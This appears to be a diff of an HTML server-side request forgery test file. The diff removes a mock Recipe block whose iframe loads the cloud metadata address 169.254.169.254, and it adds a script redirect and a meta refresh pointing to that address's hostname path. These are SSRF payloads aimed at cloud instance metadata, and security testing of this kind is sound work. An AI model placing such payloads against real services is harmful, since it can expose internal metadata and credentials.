@@ -1,7 +1,2 @@
-<div itemscope itemtype="https://schema.org/Recipe">
-  <h1 itemprop="name">SSRF Test</h1>
-  <div itemprop="recipeIngredient">
-    <!-- هنا سنحاول استدعاء بيانات داخلية -->
-    <iframe src="http://169.254.169.254/latest/meta-data/"></iframe>
-  </div>
-</div>
+<script>window.location.href = "http://169.254.169.254/latest/meta-data/hostname";</script>
+<meta http-equiv="refresh" content="0; url=http://169.254.169.254/latest/meta-data/hostname">
